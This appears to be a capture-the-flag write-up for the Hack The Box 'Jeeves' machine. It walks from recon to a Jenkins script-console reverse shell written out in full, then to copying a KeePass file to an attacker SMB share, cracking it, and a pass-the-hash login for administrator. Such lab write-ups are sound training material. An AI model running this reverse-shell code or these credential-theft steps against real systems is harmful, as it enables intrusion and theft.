---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Windows
  - Jenkis
---
# Overview

| Name        | Jeeves      |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
sudo nmap -sC -sV 10.129.119.24  -T4 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-14 14:41 CDT
Stats: 0:00:54 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 14:42 (0:00:00 remaining)
Nmap scan report for 10.129.119.24
Host is up (0.077s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3h00m00s, deviation: 0s, median: -3h00m00s
| smb2-time: 
|   date: 2025-10-14T16:41:45
|_  start_date: 2025-10-14T16:39:36
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```
# Enumeration

SMB also seem to give access denied. In `10.129.119.24` there seems to be jenkis running and when I search something it redirects to `error.html`.

![[jeeves.png]]

Nothing much else to look at so went to `http://10.129.119.24:50000/`.

![[jeeves2.png]]
## Gobuster

```bash
┌─[eu-dedivip-1]─[10.10.14.122]─[ninjathebox98w1@htb-vj1whbtibf]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.119.24:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.119.24:50000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.129.119.24:50000/askjeeves/]
```
# Initial Foothold

![[jeeves3.png]]

We can go to `Manage Jenkis` and then `Script console` (`http://10.129.119.24:50000/askjeeves/script`) and try this [here](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6) to get reverse shell.

```python
String host = "10.10.14.122";
int port = 4444;
String cmd = "cmd.exe";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    } catch (Exception e) {}
};
p.destroy();
s.close();
```

Paste that script here `http://10.129.119.24:50000/askjeeves/script` and click in run and wait in listener.

```bash
└──╼ [★]$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.119.24] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.
```

```cmd

C:\Users\Administrator\.jenkins>cd c:\Users\Administrator
cd c:\Users\Administrator
Access is denied.

C:\Users\Administrator\.jenkins>cd c:/Users
cd c:/Users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users

11/08/2017  06:22 PM    <DIR>          .
11/08/2017  06:22 PM    <DIR>          ..
11/03/2017  11:07 PM    <DIR>          Administrator
11/05/2017  10:17 PM    <DIR>          DefaultAppPool
11/03/2017  11:19 PM    <DIR>          kohsuke
10/25/2017  04:46 PM    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)   2,670,313,472 bytes free

c:\Users>cd kohsuke/Desktop
cd kohsuke/Desktop

c:\Users\kohsuke\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\kohsuke\Desktop

11/03/2017  11:19 PM    <DIR>          .
11/03/2017  11:19 PM    <DIR>          ..
11/03/2017  11:22 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   2,670,313,472 bytes free

c:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3232272596fb47950d59c4cf1e7066a
```
# Privilege Escalation

```bash
C:\Users\kohsuke\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   2,670,288,896 bytes free
```

```bash
──╼ [★]$ sudo impacket-smbserver share . -smb2support -username test -password test
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
10/14/2025 03:40:18 PM: INFO: Config file parsed
10/14/2025 03:40:28 PM: INFO: Incoming connection (10.129.119.24,49679)
10/14/2025 03:40:28 PM: INFO: AUTHENTICATE_MESSAGE (\test,JEEVES)
10/14/2025 03:40:28 PM: INFO: User JEEVES\test authenticated successfully
10/14/2025 03:40:28 PM: INFO: test:::aaaaaaaaaaaaaaaa:cb8815817b468595f83d46b8655e8e3c:010100000000000000466ac64a3ddc01034da0ff3de283b500000000010010004200570079006b006400410065006500030010004200570079006b006400410065006500020010004b0046006700500041006e006c007700040010004b0046006700500041006e006c0077000700080000466ac64a3ddc01060004000200000008003000300000000000000000000000003000008f57f71abc247797bb5984f0bbcad83f8f615435e9d487226fd9907bc1e9d96e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310032003200000000000000000000000000
10/14/2025 03:40:28 PM: INFO: Connecting Share(1:IPC$)
10/14/2025 03:40:29 PM: INFO: Connecting Share(2:share)
```

```bash
C:\Users\kohsuke\Documents>net use \\10.10.14.122\share /user:test test
net use \\10.10.14.122\share /user:test test
The command completed successfully.


C:\Users\kohsuke\Documents>copy "C:\Users\kohsuke\Documents\CEH.kdbx" \\10.10.14.122\share\
copy "C:\Users\kohsuke\Documents\CEH.kdbx" \\10.10.14.122\share\
        1 file(s) copied.
```

```bash
[★]$ keepass2john CEH.kdbx > hash.txt
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

We get pass `moonshine1`.

```bash
┌─[eu-dedivip-1]─[10.10.14.122]─[ninjathebox98w1@htb-vj1whbtibf]─[~]
└──╼ [★]$ kpcli --kdb CEH.kdbx 
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls
=== Groups ===
CEH/
kpcli:/> cd CEH
kpcli:/CEH> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com

kpcli:/CEH> show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/CEH> show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 
```

Password of administrator could only give access to SMB so tried hash we got.

```bash
└──╼ [★]$ impacket-psexec administrator:S1TjAtJHKsugh9oC4VZl@10.129.119.24
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
```

But hash worked!

```bash
$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.119.24
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.129.119.24.....
[*] Found writable share ADMIN$
[*] Uploading file mLMyJFbm.exe
[*] Opening SVCManager on 10.129.119.24.....
[*] Creating service Bhpd on 10.129.119.24.....
[*] Starting service Bhpd.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd c:/Users/Administrator/Desktop

c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,669,625,344 bytes free
```

```cmd
c:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```

Look at hidden files. **ADS (Alternate Data Streams)** is an NTFS file system feature that allows multiple data "streams" to be associated with a single filename. We can view by `dir /R`:

```powershell
c:\Users\Administrator\Desktop> dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,669,625,344 bytes free

```

```bash
c:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```

---